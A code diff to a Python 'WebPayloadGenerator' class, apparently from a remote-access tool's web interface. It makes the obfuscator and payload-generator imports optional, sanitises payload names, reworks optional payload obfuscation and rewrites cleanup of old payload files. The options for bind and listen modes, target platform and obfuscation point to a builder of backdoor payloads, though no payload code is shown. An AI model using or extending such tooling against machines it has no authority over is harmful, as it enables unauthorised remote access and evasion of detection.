@@ -12,8 +12,15 @@ import tempfile
 import base64
 from pathlib import Path
 from datetime import datetime
-import payload_obfuscator
-import fixed_payload_generator
+import re
+try:
+    import payload_obfuscator
+except Exception:
+    payload_obfuscator = None
+try:
+    import fixed_payload_generator
+except Exception:
+    fixed_payload_generator = None
 
 
 
@@ -67,7 +74,9 @@ class WebPayloadGenerator:
         enable_bind = config.get('enable_bind', True)
         enable_listen = config.get('enable_listen', True)
         target_platform = config.get('platform', 'linux').lower()
-        payload_name = config.get('payload_name', 'stitch_payload')
+        # Sanitize payload name to avoid path traversal and invalid characters
+        raw_name = config.get('payload_name', 'stitch_payload')
+        payload_name = re.sub(r'[^A-Za-z0-9._-]+', '_', raw_name).strip('._-') or 'stitch_payload'
         
         # Validate ports (only if provided and enabled)
         try:
@@ -207,14 +216,13 @@ class WebPayloadGenerator:
         except Exception as e:
             st_log.error(f"Payload generation error: {e}")
             
-            # Obfuscate if requested
-            if config.get('obfuscate', False):
+            # Optional obfuscation if requested and available
+            if config.get('obfuscate', False) and payload_obfuscator and 'payload_path' in locals():
                 try:
-                    import payload_obfuscator
                     payload_obfuscator.obfuscate_file(payload_path, payload_path)
-                    logger.info("Payload obfuscated")
-                except Exception as e:
-                    logger.warning(f"Obfuscation failed: {e}")
+                    st_log.info("Payload obfuscated")
+                except Exception as obf_err:
+                    st_log.warning(f"Obfuscation failed: {obf_err}")
 
             return {
                 'success': False,
@@ -231,37 +239,31 @@ class WebPayloadGenerator:
         return self.last_payload_path
     
     def cleanup_old_payloads(self, keep_last=5):
-        """Clean up old payload directories, keeping the most recent ones"""
+        """Clean up old payload directories/files under payloads_path, keeping the most recent ones"""
         try:
             if not os.path.exists(payloads_path):
-                return  # No payloads directory
+                return
+            entries = []
+            for root, dirs, files in os.walk(payloads_path):
+                for name in files:
+                    full_path = os.path.join(root, name)
+                    try:
+                        mtime = os.path.getmtime(full_path)
+                        entries.append((mtime, full_path))
+                    except Exception:
+                        continue
+                # Only process top-level for cleanup
+                break
+            # Sort newest first and remove everything after keep_last
+            entries.sort(key=lambda x: x[0], reverse=True)
+            for _, path in entries[keep_last:]:
+                try:
+                    os.remove(path)
+                except Exception:
+                    pass
         except Exception:
-            pass
-                
-        # Use fixed generator as primary method
-        try:
-            import fixed_payload_generator
-            fixed_path = fixed_payload_generator.generate_working_payload(config)
-            if fixed_path and os.path.exists(fixed_path):
-                # Copy to payload directory
-                import shutil
-                final_path = os.path.join(conf_dir, os.path.basename(fixed_path))
-                shutil.copy(fixed_path, final_path)
-                
-                session['payload_path'] = final_path
-                session['payload_type'] = 'executable' if not final_path.endswith('.py') else 'python'
-                
-                return {
-                    'success': True,
-                    'payload_path': final_path,
-                    'type': session['payload_type'],
-                    'size': os.path.getsize(final_path),
-                    'download_url': '/api/download-payload'
-                }
-        except Exception as e:
-            logger.warning(f"Fixed generator failed: {e}")
-            
-        return
+            # Non-fatal
+            return
 
 
 # Global instance
